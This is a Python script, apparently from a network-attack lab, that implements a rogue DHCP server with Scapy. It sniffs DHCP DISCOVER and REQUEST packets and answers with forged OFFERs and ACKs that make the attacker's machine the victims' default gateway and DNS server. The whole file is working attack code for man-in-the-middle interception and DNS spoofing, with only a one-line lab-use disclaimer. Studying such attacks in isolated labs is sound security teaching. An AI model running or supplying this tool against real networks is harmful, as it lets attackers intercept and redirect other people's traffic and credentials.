#!/usr/bin/env python3
"""
rogue_dhcp.py — Rogue DHCP Server (Machine 2 — Attacker)
=========================================================
Listens for DHCP DISCOVER and REQUEST packets and responds FASTER
than the legitimate server, sending crafted OFFERs/ACKs that redirect
victim traffic through the attacker's machine (MITM setup).

Malicious settings injected:
  • Default gateway → Attacker IP   (all traffic flows through attacker)
  • DNS server      → Attacker IP   (enables DNS spoofing)

⚠️  FOR EDUCATIONAL / LAB USE ONLY.
"""

import time
import threading
import random

from scapy.all import (
    sniff, sendp, Ether, IP, UDP, BOOTP, DHCP,
    get_if_hwaddr, conf, RandShort
)

from config import (
    ATTACKER_IF,
    ROGUE_SERVER_IP,
    ROGUE_GATEWAY,
    ROGUE_DNS,
    ROGUE_POOL_START,
    ROGUE_POOL_END,
    SUBNET_MASK,
    LEASE_TIME,
    BROADCAST,
)
from utils import (
    get_logger, generate_pool, mac_str_to_bytes,
    mac_bytes_to_str, get_dhcp_option,
    dhcp_msg_type_name, print_banner,
)

log = get_logger("ROGUE-DHCP")
conf.checkIPaddr = False


# ─────────────────────────────────────────────
# ROGUE LEASE TABLE
# ─────────────────────────────────────────────

class RogueLeaseDB:
    def __init__(self):
        self._lock    = threading.Lock()
        self._pool    = generate_pool(ROGUE_POOL_START, ROGUE_POOL_END)
        self._mac_map = {}   # mac → ip

    def allocate(self, mac: str) -> str | None:
        with self._lock:
            if mac in self._mac_map:
                return self._mac_map[mac]
            if not self._pool:
                return None
            ip = self._pool.pop(0)
            self._mac_map[mac] = ip
            return ip

    def get(self, mac: str) -> str | None:
        with self._lock:
            return self._mac_map.get(mac)


# ─────────────────────────────────────────────
# ROGUE SERVER
# ─────────────────────────────────────────────

class RogueDHCPServer:

    def __init__(self, iface: str = ATTACKER_IF):
        self.iface      = iface
        self.server_mac = get_if_hwaddr(iface)
        self.db         = RogueLeaseDB()
        self._stats     = {"offers": 0, "acks": 0}
        log.warning(
            f"Rogue DHCP Server starting on {iface} ({self.server_mac})\n"
            f"  Rogue IP      : {ROGUE_SERVER_IP}\n"
            f"  Malicious GW  : {ROGUE_GATEWAY}\n"
            f"  Malicious DNS : {ROGUE_DNS}\n"
            f"  Pool          : {ROGUE_POOL_START} – {ROGUE_POOL_END}"
        )

    # ── packet handler ─────────────────────────────

    def handle(self, pkt) -> None:
        if DHCP not in pkt or BOOTP not in pkt:
            return

        msg_type = get_dhcp_option(pkt, "message-type")
        if msg_type is None:
            return

        # Ignore our own packets
        if pkt[Ether].src == self.server_mac:
            return

        name = dhcp_msg_type_name(msg_type)
        src_mac = pkt[Ether].src.lower()
        log.info(f"[RX] {name} from {src_mac}")

        if msg_type == 1:   # DISCOVER → OFFER immediately
            self._handle_discover(pkt, src_mac)
        elif msg_type == 3:  # REQUEST → ACK
            self._handle_request(pkt, src_mac)

    # ── DISCOVER → OFFER ───────────────────────────

    def _handle_discover(self, pkt, mac: str) -> None:
        offered_ip = self.db.allocate(mac)
        if not offered_ip:
            log.error("[ROGUE] Pool exhausted")
            return

        log.warning(f"[ROGUE OFFER] {mac} → {offered_ip}  (GW={ROGUE_GATEWAY})")
        self._send_offer(pkt, mac, offered_ip)
        self._stats["offers"] += 1

    def _send_offer(self, pkt, client_mac: str, offered_ip: str) -> None:
        xid = pkt[BOOTP].xid
        offer = (
            Ether(src=self.server_mac, dst=client_mac)
            / IP(src=ROGUE_SERVER_IP, dst=BROADCAST)
            / UDP(sport=67, dport=68)
            / BOOTP(
                op=2, xid=xid,
                yiaddr=offered_ip,
                siaddr=ROGUE_SERVER_IP,
                chaddr=mac_str_to_bytes(client_mac) + b"\x00" * 10,
            )
            / DHCP(options=[
                ("message-type", "offer"),
                ("server_id",    ROGUE_SERVER_IP),
                ("lease_time",   LEASE_TIME),
                ("subnet_mask",  SUBNET_MASK),
                ("router",       ROGUE_GATEWAY),     # ← malicious gateway
                ("name_server",  ROGUE_DNS),          # ← malicious DNS
                "end",
            ])
        )
        sendp(offer, iface=self.iface, verbose=False)

    # ── REQUEST → ACK ──────────────────────────────

    def _handle_request(self, pkt, mac: str) -> None:
        server_id = get_dhcp_option(pkt, "server_id")

        # Only respond if the client accepted OUR offer
        if server_id and server_id != ROGUE_SERVER_IP:
            return

        assigned_ip = self.db.get(mac)
        if not assigned_ip:
            assigned_ip = self.db.allocate(mac)
        if not assigned_ip:
            return

        log.warning(f"[ROGUE ACK] {mac} → {assigned_ip}  (GW={ROGUE_GATEWAY})")
        self._send_ack(pkt, mac, assigned_ip)
        self._stats["acks"] += 1

    def _send_ack(self, pkt, client_mac: str, ip: str) -> None:
        xid = pkt[BOOTP].xid
        ack = (
            Ether(src=self.server_mac, dst=client_mac)
            / IP(src=ROGUE_SERVER_IP, dst=BROADCAST)
            / UDP(sport=67, dport=68)
            / BOOTP(
                op=2, xid=xid,
                yiaddr=ip,
                siaddr=ROGUE_SERVER_IP,
                chaddr=mac_str_to_bytes(client_mac) + b"\x00" * 10,
            )
            / DHCP(options=[
                ("message-type", "ack"),
                ("server_id",    ROGUE_SERVER_IP),
                ("lease_time",   LEASE_TIME),
                ("subnet_mask",  SUBNET_MASK),
                ("router",       ROGUE_GATEWAY),
                ("name_server",  ROGUE_DNS),
                "end",
            ])
        )
        sendp(ack, iface=self.iface, verbose=False)

    # ── run ────────────────────────────────────────

    def run(self) -> None:
        print_banner("ROGUE DHCP SERVER  (Machine 2 — Attacker)")
        log.warning(f"Listening on {self.iface} for DISCOVER/REQUEST packets ...")
        sniff(
            iface=self.iface,
            filter="udp and (port 67 or port 68)",
            prn=self.handle,
            store=False,
        )


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────

if __name__ == "__main__":
    import sys

    iface = sys.argv[1] if len(sys.argv) > 1 else ATTACKER_IF
    server = RogueDHCPServer(iface=iface)
    try:
        server.run()
    except KeyboardInterrupt:
        log.info(
            f"Rogue server stopped. "
            f"OFFERs sent: {server._stats['offers']}  "
            f"ACKs sent: {server._stats['acks']}"
        )
